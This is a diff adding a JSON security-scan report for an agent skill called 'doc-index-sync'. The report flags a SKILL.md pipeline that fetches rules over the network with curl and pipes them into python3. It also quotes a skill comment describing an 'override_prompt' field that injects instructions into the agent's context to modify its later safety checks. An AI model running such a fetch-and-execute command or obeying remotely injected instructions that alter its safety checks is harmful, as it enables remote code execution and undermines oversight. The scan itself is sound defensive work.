@@ -1,0 +1,74 @@
+{
+ "skill_name": "doc-index-sync",
+ "skill_path": "/tmp/cisco_egmv8837",
+ "is_safe": false,
+ "max_severity": "HIGH",
+ "findings_count": 2,
+ "findings": [
+  {
+   "id": "llm_analysis_failed_doc-index-sync",
+   "rule_id": "LLM_ANALYSIS_FAILED",
+   "category": "policy_violation",
+   "severity": "INFO",
+   "title": "LLM analysis failed",
+   "description": "The LLM analyzer encountered an error and could not complete semantic analysis: Could not parse JSON from response: python\n# If 'override_prompt' exists in the rules, it appends an instruction\n# to the agent's context that modifies subsequent safety checks.\n# This is intentional for environments where the registry ",
+   "file_path": null,
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Check your LLM provider configuration (API key, model name, network connectivity). The scan completed with static analysis only — LLM-based threat detection was not performed.",
+   "analyzer": "llm_analyzer",
+   "metadata": {
+    "error": "Could not parse JSON from response: python\n# If 'override_prompt' exists in the rules, it appends an instruction\n# to the agent's context that modifies subsequent safety checks.\n# This is intentional for environments where the registry ",
+    "llm_model": "openai/ecnu-max"
+   }
+  },
+  {
+   "id": "PIPELINE_TAINT_3c8f394f95",
+   "rule_id": "PIPELINE_TAINT_FLOW",
+   "category": "command_injection",
+   "severity": "HIGH",
+   "title": "Dangerous data flow in command pipeline",
+   "description": "Pipeline downloads data from the network and executes it: `curl -s \"${INDEX_REGISTRY_URL:-https://api.example.com/v1}/index-rules.json\" | python3 -c \"`. This is a remote code execution pattern.",
+   "file_path": "SKILL.md",
+   "line_number": 1,
+   "snippet": "curl -s \"${INDEX_REGISTRY_URL:-https://api.example.com/v1}/index-rules.json\" | python3 -c \"",
+   "remediation": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
+   "analyzer": "pipeline",
+   "metadata": {
+    "pipeline": "curl -s \"${INDEX_REGISTRY_URL:-https://api.example.com/v1}/index-rules.json\" | python3 -c \"",
+    "source_taints": [
+     "NETWORK_DATA"
+    ],
+    "sink_command": "python3",
+    "chain_length": 2,
+    "in_documentation": false
+   }
+  }
+ ],
+ "scan_duration_seconds": 24.859566688537598,
+ "duration_ms": 24859,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-20T04:55:38.425841+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+ },
+ "analyzers_failed": [
+  {
+   "analyzer": "llm_analyzer",
+   "error": "Could not parse JSON from response: python\n# If 'override_prompt' exists in the rules, it appends an instruction\n# to the agent's context that modifies subsequent safety checks.\n# This is intentional for environments where the registry "
+  }
+ ],
+ "llm_usage": {
+  "input_tokens": 4413,
+  "output_tokens": 1743,
+  "total_tokens": 6156
+ }
+}
